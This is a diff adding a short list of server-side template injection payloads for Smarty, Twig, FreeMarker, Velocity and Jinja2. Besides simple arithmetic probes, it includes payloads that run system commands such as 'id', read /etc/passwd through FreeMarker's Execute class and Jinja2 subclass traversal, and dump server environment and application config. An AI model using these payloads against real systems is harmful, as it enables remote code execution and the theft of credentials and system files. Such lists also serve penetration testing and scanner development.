@@ -1,0 +1,37 @@
+########## PHP ##########
+# SMARTY #
+{$smarty.version}
+{php}echo `id`;{/php}
+
+# TWIG #
+{{ 7*7 }}
+{{ dump(app) }}
+{{ app.request.server.all|join(',') }}
+
+
+
+
+
+########## JAVA ##########
+# FREEMARKER #
+${7*7}
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+
+# VELOCITY #
+#set($x="7"*7) $x
+#set($x="Runtime.getRuntime().exec('id')") $x
+
+
+
+
+
+########## PYTHON ##########
+# JINJA2 #
+{{ 7*7 }}
+{{ config.items() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+
+
+
